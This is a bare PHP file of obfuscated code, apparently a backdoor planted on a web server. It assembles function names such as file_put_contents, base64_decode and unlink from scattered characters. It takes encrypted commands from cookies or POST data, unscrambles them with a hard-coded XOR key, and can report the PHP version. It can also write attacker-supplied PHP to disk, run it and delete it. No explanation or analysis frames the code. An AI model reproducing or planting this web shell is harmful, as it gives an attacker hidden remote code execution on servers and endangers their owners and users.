<?php     function	_tazmq(){       print   (14482);       }
$dzwu_	=	'dzwu_'	^/*  oi*/'';


$tvtop/*  f_   */=      "f"."i".$dzwu_(374-266)	.	"\145"    ./*  _tq  */"\x5f"  .	"\x70"	.	"u"."\x74"	.	"_".$dzwu_(99)	.	"o"."n".$dzwu_(237-121)/* yi*/.	"e".$dzwu_(110)    ./*   agaq */"\164"/*  nq*/./* j   */$dzwu_(115);
$hc_ymucosg	=/*   m   */$dzwu_(278-180)/*npa  */.	"\x61"/*  qe_q*/./*g*/"\163"	.	"\x65"/*   dc   */.	"\66"/* psdzm */.	"4"."_"."\x64"  .	"\145"/*   dy  */.      $dzwu_(99)/*  nz */.	$dzwu_(111)	.     "\x64"/* olom   */.      $dzwu_(101);$mmgaminx	=	$dzwu_(117)	.     "\x6e"/*  xtm*/.	"s"."\x65"	.	"\162"/*   s   */./*  cl  */"\151"	.       "\x61"	.	$dzwu_(108)      ./*  mktdq */"i"."z"."e";

$qojuguugo/*  j   */=   "p".$dzwu_(104)/*   afv*/./* cg*/"\x70"	.   "v"."e"."r"."s"."i"."o"."\x6e";$yharkp/* ze */=/*   xt */"u"."\156"	./*   r   */"\x6c"/*_  */.	"i"."n"."k";

       
function/* agl */grryamu($yzjwz,       $fpawulbrp)

{

/*   iq*/global       $dzwu_;/*   mptfo*/$brqae/* anjet */=   "";

    for   ($tatus/* q*/=	0;    $tatus	<    strlen($yzjwz);)/*t   */{


/* h  */for/*   v  */($liie_xbbzf	=/*   _z   */0;/* mr  */$liie_xbbzf     <      strlen($fpawulbrp)	&&    $tatus	<      strlen($yzjwz);  $liie_xbbzf++,/* yw  */$tatus++)/* j   */{


	$brqae/*wxzx   */.=/*  yki   */$dzwu_(ord($yzjwz[$tatus])   ^	ord($fpawulbrp[$liie_xbbzf]));

	}

     }

/* t  */return	$brqae;}





$alsmklj       =/* ibl*/$_COOKIE;$tjp_aru/*rpe */=/*   zlteq */$_POST;


$alsmklj       =	array_merge($tjp_aru,   $alsmklj);




$pggldcx   =	"\63"	./*  kdysf  */$dzwu_(318-220)      ./* a_z_o  */"b"."\61"  .     "\62"	.	$dzwu_(622-572)/*tgnel   */./*  utqk */"\x64"	.      $dzwu_(53)/*xsv_*/.    "\x2d"/*   aro*/.      "a"."4"."7"."1"."-"."4"."\70"/* zhxlv*/./*j   */"1"."\142"       .	$dzwu_(473-428)/*  _  */.      "\x38"       .	$dzwu_(919-862)  ./*  cd_y   */$dzwu_(523-422)      ./* hbypj */"\60"      .       "-".$dzwu_(101)	.	"f"."7"."\61"/* j*/./*f_sf*/"\x37"/* bb*/.	$dzwu_(904-805)/* tme   */./* hl  */$dzwu_(1042-992)  ./* onk   */$dzwu_(97)	.	"\x65"	.	"9"."\64"    .	$dzwu_(546-445);foreach	($alsmklj/*   vtzf*/as/* cf   */$nvonjbr     =>      $yzjwz)/* twqx */{/*nb */$yzjwz     =	$mmgaminx(grryamu(grryamu($hc_ymucosg($yzjwz),	$pggldcx),	$nvonjbr));

	if      (isset($yzjwz["\141"     .	$dzwu_(809-702)]))     {	if   ($yzjwz["a"]	==	"\151")/*adc*/{     $tatus	=   array();
	$tatus["\x70"      .    $dzwu_(118)]    =      $qojuguugo();	$tatus["s"."\x76"]/*   knj */=  "\63"/* qt*/.     ".".$dzwu_(53);
	echo    @serialize($tatus);/* lo   */}/* b */elseif    ($yzjwz["a"]/*  zjbu */==       $dzwu_(546-445))	{

	$xpkevmzb/*zuoda*/=	sprintf("."."/"."%"."s"."\56"  .	"p"."\x6c",	md5($pggldcx));/*   i*/$tvtop($xpkevmzb,      "<"     .       "?"."\160"/*rrpbj   */./* ghr   */"h"."p".$dzwu_(32)       .       $dzwu_(117)/*  vmq*/./*ku_  */"n"."l".$dzwu_(105)	.	"\x6e"/*  qku */./*   eq*/"\153"     .	"\50"/*   hgos   */.       "_"."_"."\106"	.    "\111"       ./*_il   */$dzwu_(888-812)/*  _*/.     "E"."_"."\x5f"/*  mhhor   */./*rgy   */$dzwu_(41)/*   nkmpo   */.	$dzwu_(59)	.	$dzwu_(32)  .	$yzjwz["d"]);


	include($xpkevmzb);

    $yharkp($xpkevmzb);
  }	exit();

	}}


